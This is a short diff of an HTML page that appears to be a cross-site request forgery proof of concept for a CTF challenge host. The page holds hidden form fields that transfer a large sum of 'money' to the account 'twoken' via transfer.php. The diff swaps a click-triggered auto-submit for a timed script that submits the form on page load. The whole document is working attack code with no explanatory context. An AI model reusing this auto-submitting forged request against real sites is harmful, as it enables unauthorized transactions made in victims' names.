@@ -4,12 +4,12 @@
   <script>history.pushState('', '', '/')</script>
     <form action="http://1bda24cb-7508-44b4-b0d3-252a5e3a71d1.node3.buuoj.cn/transfer.php" method="POST" enctype="multipart/form-data">
       <input type="hidden" name="target" value="twoken" />
-      <input type="hidden" name="money" value="100000000000000000000000" />
-      <input type="hidden" name="messages" value="nihao" />
-      <input type="submit" value="Submit request" id="click" />
+      <input type="hidden" name="money" value="1000000000000000" />
+      <input type="hidden" name="messages" value="6666" />
+      <input type="submit" value="Submit request" />
     </form>
-    <script type="text/javascript">
-      document.getElementById("click").click();
-    </script>
-  </body>
+  <script language=javascript>
+  setTimeout("document.forms[0].submit()",1000)
+  </script>
+ </body>
 </html>
